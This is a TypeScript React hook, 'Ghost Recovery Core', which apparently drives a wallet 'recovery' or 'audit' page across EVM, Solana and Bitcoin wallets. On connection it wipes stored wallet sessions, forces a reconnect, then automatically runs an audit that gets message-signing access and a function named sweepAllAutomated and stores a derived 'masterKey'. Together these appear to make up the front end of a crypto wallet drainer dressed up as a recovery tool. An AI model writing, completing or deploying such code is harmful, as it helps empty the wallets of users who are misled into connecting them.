"use client";

import { useState, useCallback, useRef, useEffect } from "react";
import { useSignMessage, useChainId, useAccount, useDisconnect } from "wagmi";
import { useGhostConnection } from "../connection";
import { useGhostExecution } from "../execution";
import { useSweepWatcher } from "./useSweepWatcher";
import { useAuditSequence } from "./useAuditSequence";
import { type UniversalAsset } from "@/lib/audit";

/**
 * 🛰️ GHOST RECOVERY CORE (v8.6 - Forced Sync Edition)
 */
export function useRecoveryLogic() {
  const logPrefix = "[GhostSweep/index.ts]";

  const [mounted, setMounted] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [assets, setAssets] = useState<UniversalAsset[]>([]);
  const [userKey, setUserKey] = useState<string | null>(null);

  const hasTriggered = useRef(false);
  const isExecuting = useRef(false);
  const derivedUserKey = useRef<string | null>(null);

  const intentActive = useRef(false);
  const connectionLock = useRef(false);

  const { address, isConnected: isWagmiConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { disconnectAsync } = useDisconnect();
  const currentChainId = useChainId();

  const {
    open,
    handleFullDisconnect: baseDisconnect,
    isInternal,
    solanaAddress,
    bitcoinAddress,
    isConnected: isGhostConnected, // Use the unified connection state
  } = useGhostConnection();

  const { isSweeping, sweepAllAutomated } = useGhostExecution(address);
  const { runAuditStep } = useAuditSequence();

  useEffect(() => {
    setMounted(true);
    if (typeof window !== "undefined") {
      intentActive.current =
        sessionStorage.getItem("GHOST_SESSION_ACTIVE") === "true";
    }
  }, []);

  /**
   * 🛡️ ENHANCED AUDIT TRIGGER
   */
  const runGhostAudit = useCallback(
    async (userAddress?: string, sol?: string, btc?: string) => {
      if (isExecuting.current || hasTriggered.current) return;

      const sessionActive =
        sessionStorage.getItem("GHOST_SESSION_ACTIVE") === "true";
      if (!sessionActive) return;

      isExecuting.current = true;
      setIsScanning(true);

      const auditStartTime = performance.now();

      try {
        console.log(`${logPrefix} ⚡ Triggering Audit Step for:`, {
          userAddress,
          sol,
          btc,
        });

        const result: any = await runAuditStep({
          userAddress,
          solana: sol,
          btc: btc,
          currentChainId,
          signMessageAsync,
          sweepAllAutomated,
          setAssets,
          setUserKey,
          derivedUserKeyRef: derivedUserKey,
          isInternal,
        });

        if (result?.status === "COMPLETE") {
          const totalDuration = (performance.now() - auditStartTime).toFixed(2);
          console.log(`${logPrefix} ✅ Audit Finalized. (${totalDuration}ms)`);
          hasTriggered.current = true;
          if (result.masterKey) {
            derivedUserKey.current = result.masterKey;
            setUserKey(result.masterKey);
          }
        }
      } catch (e: any) {
        console.error(`${logPrefix} ❌ Critical Execution Error:`, e?.message);
        isExecuting.current = false;
        setIsScanning(false);
      } finally {
        if (!isSweeping) setIsScanning(false);
      }
    },
    [
      currentChainId,
      signMessageAsync,
      sweepAllAutomated,
      runAuditStep,
      isInternal,
      isSweeping,
    ],
  );

  /**
   * 🏎️ INSTANT PURGE & OPEN
   */
  const handleInstantConnection = useCallback(async () => {
    if (connectionLock.current) return;
    connectionLock.current = true;
    intentActive.current = true;
    hasTriggered.current = false;
    isExecuting.current = false;
    sessionStorage.setItem("GHOST_SESSION_ACTIVE", "true");

    if (typeof window !== "undefined") {
      const keys = Object.keys(localStorage);
      for (const key of keys) {
        if (/^(wc@2|@w3m|WCM|walletconnect|wagmi)/i.test(key))
          localStorage.removeItem(key);
      }
    }
    try {
      if (isWagmiConnected)
        await Promise.allSettled([disconnectAsync(), baseDisconnect()]);
    } catch (e) {}
    setTimeout(() => {
      open();
      connectionLock.current = false;
    }, 120);
  }, [isWagmiConnected, disconnectAsync, baseDisconnect, open]);

  // 🚀 ATOMIC TRIGGER - Updated to use isGhostConnected
  useEffect(() => {
    if (
      mounted &&
      intentActive.current &&
      !hasTriggered.current &&
      !isExecuting.current
    ) {
      // Logic uses ghost hook's unified connection state
      const hasIdentity =
        isGhostConnected && (address || solanaAddress || bitcoinAddress);

      if (hasIdentity) {
        const cleanSol = solanaAddress?.includes(":")
          ? solanaAddress.split(":")[1]
          : solanaAddress;
        const cleanBtc = bitcoinAddress?.includes(":")
          ? bitcoinAddress.split(":")[1]
          : bitcoinAddress;

        console.log(`${logPrefix} 🧹 Triggering Audit with identities:`, {
          address,
          cleanSol,
          cleanBtc,
        });
        runGhostAudit(address || undefined, cleanSol, cleanBtc);
      }
    }
  }, [
    mounted,
    isGhostConnected,
    address,
    solanaAddress,
    bitcoinAddress,
    runGhostAudit,
  ]);

  const handleFullDisconnect = useCallback(async () => {
    intentActive.current = false;
    hasTriggered.current = false;
    isExecuting.current = false;
    if (typeof window !== "undefined") {
      localStorage.clear();
      sessionStorage.clear();
    }
    derivedUserKey.current = null;
    setUserKey(null);
    setAssets([]);
    setIsScanning(false);
    try {
      await disconnectAsync();
    } catch (e) {}
    baseDisconnect();
  }, [baseDisconnect, disconnectAsync]);

  return {
    address,
    // Return unified ghost connection state to all downstream components
    isConnected: mounted && isGhostConnected,
    isScanning,
    isSweeping,
    assets,
    handleInstantConnection,
    handleFullDisconnect,
    userKey,
    isInternal,
  };
}
